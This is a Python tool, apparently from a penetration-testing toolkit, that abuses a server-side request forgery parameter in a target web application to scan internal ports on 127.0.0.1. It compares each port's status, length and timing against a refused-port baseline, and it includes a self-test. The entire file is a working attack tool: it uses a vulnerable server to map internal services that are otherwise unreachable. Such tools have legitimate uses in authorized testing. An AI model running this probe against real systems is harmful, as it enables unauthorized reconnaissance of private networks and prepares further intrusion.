#!/usr/bin/env python3
"""ssrf_probe.py — internal-port oracle for the web-ssrf class.

The class's probe is a status oracle: one address you control, then the
same request against internal-only addresses — open and closed ports
differ by status OR timing. This fires a refused-port baseline
(127.0.0.1:1), then a bounded port list through the same SSRF parameter,
and measures each response against the baseline: status change, length
change, or elapsed change (a connect-accept is fast, a refused port is
instant, a filtered port hangs). Each differing port is a CANDIDATE
with the verbatim measurement — the content the port serves is the
skill's next probe, not this one's claim.

    python3 tools/web/ssrf_probe.py --url 'http://h/fetch?u={M}'
    python3 tools/web/ssrf_probe.py --url URL --param u --ports 22,80,3000
    python3 tools/web/ssrf_probe.py --selftest
"""
from __future__ import annotations

import argparse
import sys
import time
import urllib.parse

import httpkit

_PORTS = [22, 80, 443, 3000, 3306, 5432, 6379, 8000, 8080, 9000]
_REFUSED = "http://127.0.0.1:1/"


def _fire(args, target):
    url = args["url"]
    v = urllib.parse.quote(target, safe="")
    if args.get("param"):
        q = urllib.parse.urlparse(url)
        pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
        pairs = [(k, target if k == args["param"] else val)
                 for k, val in pairs]
        if args["param"] not in [k for k, _ in pairs]:
            pairs.append((args["param"], target))
        url = urllib.parse.urlunparse(
            q._replace(query=urllib.parse.urlencode(pairs)))
    elif args.get("body"):
        body = args["body"].replace("{M}", urllib.parse.quote_plus(target))
        t0 = time.time()
        r = httpkit.request(url, method=args.get("method", "POST"),
                            headers=args.get("headers"), body=body,
                            timeout=args.get("timeout", 12))
        r["_elapsed"] = round(time.time() - t0, 3)
        return r
    else:
        url = url.replace("{M}", v)
    t0 = time.time()
    r = httpkit.request(url, headers=args.get("headers"),
                        timeout=args.get("timeout", 12))
    r["_elapsed"] = round(time.time() - t0, 3)
    return r


def _sig(r):
    body = r.get("body", "")
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    return {"status": r.get("status"), "len": len(body),
            "elapsed": r.get("_elapsed"), "error": r.get("error"),
            "body_head": body[:200]}


def sweep(args) -> dict:
    base = _sig(_fire(args, _REFUSED))
    ports = args.get("ports") or _PORTS
    out = {"url": args["url"], "param": args.get("param"),
           "refused_baseline": {k: v for k, v in base.items()
                                if k != "body_head"},
           "baseline_excerpt": base["body_head"][:120], "cases": []}
    cand = []
    for p in ports:
        t = f"http://127.0.0.1:{p}/"
        s = _sig(_fire(args, t))
        diffs = []
        if s["status"] != base["status"]:
            diffs.append(f"status {base['status']}->{s['status']}")
        if abs(s["len"] - base["len"]) > 16:
            diffs.append(f"len {base['len']}->{s['len']}")
        be, se = base["elapsed"] or 0, s["elapsed"] or 0
        if abs(se - be) > max(0.8, 2 * (be + 0.05)):
            diffs.append(f"elapsed {be}s->{se}s")
        rec = {"port": p, "target": t, "status": s["status"],
               "len": s["len"], "elapsed": s["elapsed"],
               "body_head": s["body_head"][:120]}
        if diffs:
            rec["differs_by"] = diffs
            cand.append(rec)
        out["cases"].append(rec)
    out["open_port_candidates"] = cand
    out["candidate_only"] = True
    if not cand:
        out["note"] = ("every internal port looked like the refused "
                       "baseline — the param may not reach a fetch, or "
                       "the oracle needs a different signal; record "
                       "inconclusive")
    return out


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Fetch(BaseHTTPRequestHandler):
        def do_GET(self):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            u = q.get("u", [""])[0]
            if ":8000/" in u or ":8080/" in u:
                body = b"internal service banner: ok"
                code = 200
            else:
                body = b"fetch failed"
                code = 502
            self.send_response(code)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Fetch)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/fetch?u=x"
    out = sweep({"url": url, "param": "u", "headers": {}, "timeout": 12,
                 "ports": [22, 8000]})
    srv.shutdown()
    hits = {c["port"] for c in out["open_port_candidates"]}
    assert hits == {8000}, out
    print("ssrf_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", help="endpoint; {M} marks the URL slot, or --param")
    ap.add_argument("--param")
    ap.add_argument("--body", help="POST body; {M} marks the URL slot")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--ports", help="comma list; default common set")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not (args.param or args.body or "{M}" in args.url):
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    if args.ports:
        a["ports"] = [int(p) for p in args.ports.split(",") if p.strip()]
    httpkit.jprint(sweep(a))
    return 0


if __name__ == "__main__":
    sys.exit(main())
